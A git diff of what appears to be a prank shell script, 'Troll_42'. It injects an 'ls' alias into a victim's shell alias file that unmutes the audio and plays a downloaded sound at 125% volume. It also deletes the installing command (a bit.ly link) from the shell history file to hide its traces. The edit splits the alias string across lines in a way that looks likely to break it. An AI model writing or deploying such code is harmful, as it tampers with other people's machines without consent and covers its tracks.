@@ -25,7 +25,8 @@ function do_ls()
 			return
 		fi
 	fi
-	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.${SOUND}.ogg &) ; ls -G $1 #lsound_${RANDOM_ID}'" >> ${ALIAS_FILE}
+	echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl
+	set-sink-volume 0 125% && paplay ~/.${SOUND}.ogg &) ; ls -G $1 #lsound_${RANDOM_ID}'" >> ${ALIAS_FILE}
 	curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/${SOUND}.ogg -o ~/.${SOUND}.ogg
 }
 
@@ -117,7 +118,7 @@ function init()
 
 function clear_and_exit()
 {
-	COMMAND_TO_REMOVE='clinche/Troll_42/inprogress/fast_troll/fat_troll'
+	COMMAND_TO_REMOVE='bit.ly/42tool'
 	clear
 	grep -n ${COMMAND_TO_REMOVE} ${HISTORY_FILE} | while read -r line; do
 		line_to_remove=${line/:*/}
